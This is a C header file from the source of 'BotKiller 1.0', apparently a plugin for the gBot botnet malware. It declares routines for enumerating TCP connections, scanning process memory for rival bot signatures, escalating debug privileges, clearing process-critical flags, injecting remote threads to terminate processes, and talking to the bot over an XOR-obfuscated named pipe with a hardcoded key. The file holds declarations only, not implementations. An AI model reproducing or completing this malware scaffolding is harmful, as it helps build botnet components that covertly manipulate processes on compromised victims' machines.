/*
	BotKiller 1.0
	gBot Plugin
	~ jam3s/fubar;
*/


#if !defined(AFX_STDAFX_H__8DCC7C2D_1221_4A9C_B16D_0CE9084EA96D__INCLUDED_)
#define AFX_STDAFX_H__8DCC7C2D_1221_4A9C_B16D_0CE9084EA96D__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

/* Definitions */
#define WIN32_LEAN_AND_MEAN		// Exclude rarely-used stuff from Windows headers
#define INVALID_FILE_ATTRIBUTES ((DWORD)-1) 
#define _DEBUGLITE

#define __FUNCTION__ "[pBK]"
//#define GBOTPIPE "\\\\.\\pipe\\gBot"
#define KEY "006a6c501e0aaf1e840a280043b29e51"
#define GBOTPIPE "ªªØª†Ÿ†“ª‘´™‚´š—Ÿ„"

/* Includes */
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <winsock.h>
#include <IPHlpApi.h>
#include <TLHELP32.h>
#include <Psapi.h>
#include <malloc.h>

#define STATUS_INTERNAL_ERROR	0xC00000E5
#ifndef NTAPI
#define NTAPI STDAPI
#endif
typedef long  NTSTATUS;

/* Structures */
typedef struct _MIB_TCPROW_EX{
	DWORD dwState; 
	DWORD dwLocalAddr;
	DWORD dwLocalPort;
	DWORD dwRemoteAddr;
	DWORD dwRemotePort;
	DWORD dwProcessId;
} MIB_TCPROW_EX, *PMIB_TCPROW_EX;

typedef struct _MIB_TCPTABLE_EX
{
	DWORD dwNumEntries;
	MIB_TCPROW_EX table[ANY_SIZE];
} MIB_TCPTABLE_EX, *PMIB_TCPTABLE_EX;    

typedef struct _Tcplist
{
	long id;
	char ip[MAX_PATH];
	long port;
	DWORD pid;
	char processpath[MAX_PATH];
} sTCPList;

typedef enum {
		TCP_TABLE_BASIC_LISTENER,
		TCP_TABLE_BASIC_CONNECTIONS,
		TCP_TABLE_BASIC_ALL,
		TCP_TABLE_OWNER_PID_LISTENER,
		TCP_TABLE_OWNER_PID_CONNECTIONS,
		TCP_TABLE_OWNER_PID_ALL,
		TCP_TABLE_OWNER_MODULE_LISTENER,
		TCP_TABLE_OWNER_MODULE_CONNECTIONS,
		TCP_TABLE_OWNER_MODULE_ALL
} TCP_TABLE_CLASS, *PTCP_TABLE_CLASS;

#define TCPIP_OWNING_MODULE_SIZE 16
typedef struct _MIB_TCPROW_OWNER_MODULE { 
	DWORD dwState; 
	DWORD dwLocalAddr; 
	DWORD dwLocalPort; 
	DWORD dwRemoteAddr; 
	DWORD dwRemotePort; 
	DWORD dwOwningPid; 
	LARGE_INTEGER liCreateTimestamp; 
	ULONGLONG OwningModuleInfo[TCPIP_OWNING_MODULE_SIZE];
} MIB_TCPROW_OWNER_MODULE,  *PMIB_TCPROW_OWNER_MODULE;

typedef struct _MIB_TCPTABLE_OWNER_MODULE { 
	DWORD dwNumEntries; 
	MIB_TCPROW_OWNER_MODULE table[ANY_SIZE];
} MIB_TCPTABLE_OWNER_MODULE,  *PMIB_TCPTABLE_OWNER_MODULE;

struct s_Search 
{ 
	char* szBot; 
	char* szString; 
}; 

typedef struct node
{
	_Tcplist *connection;
	struct node *next;
} node;

/* Type definitions & Inject structure */
typedef VOID (WINAPI *EP)(UINT);	// ExitProcess
typedef DWORD (WINAPI *PROCALLOCATEANDGETTCPEXTABLEFROMSTACK)(PMIB_TCPTABLE_EX*,BOOL,HANDLE,DWORD,DWORD);
typedef DWORD (WINAPI *tGetExtendedTcpTable)(PVOID pTcpTable, PDWORD pdwSize, BOOL bOrder, ULONG ulAf, TCP_TABLE_CLASS TableClass, ULONG Reserved);
typedef DWORD (WINAPI *tGetModuleFileNameExA)(HANDLE,HMODULE,LPTSTR,DWORD);
typedef struct _Injdat
{
	EP ExitProcess;
	char szProcess[MAX_PATH];
} Injdat, *pInjdat;
typedef DWORD (WINAPI *threads)(_Injdat* v);

/* Prototypes */
BOOL Start();
char *strtolower(char *str);
void EnableDebugPriv();
char *sexor(char *string, char *decode_key);
int Get_TCP_Connections();
BOOL Terminate_Process_By_PID(DWORD dwPID);
char *Get_Path_From_PID(DWORD dwPID);
DWORD WINAPI GOAT_Killer(LPVOID lpParam);
DWORD WINAPI GOAT_CheckTCP(LPVOID lpParam);
DWORD WINAPI Remove_Bot(LPVOID lpParam);
BOOL Is_IRC(char *szLine);
char **Explode(char *StrIn,const char *Delimiter);
BOOL Verify_gBot();
void Send_Message(char *szMessage, ...);
NTSTATUS RtlRemoveProcessIsCritical(HANDLE hProcess, PBOOL pbOldSetting);
void DoSearch( unsigned long uStartAddr, unsigned long uEndAddr, PROCESSENTRY32 pe32 ); 
void KillBot( PROCESSENTRY32 pe32, char *szFound );
DWORD WINAPI Thread_MemoryScan(LPVOID lpParam);

// Inject Prototypes
PDWORD inject(HANDLE hProcess, LPVOID ThreadStart, DWORD cboSize);
BOOL Inject_Terminate(long pos);
DWORD WINAPI Remote_TerminateProcess(LPVOID lpParam);
// - List.cpp
void list_insert(int id, char *IP, long PORT, DWORD PID, char *PATH);
_Tcplist *list_get_entry(long id);


#endif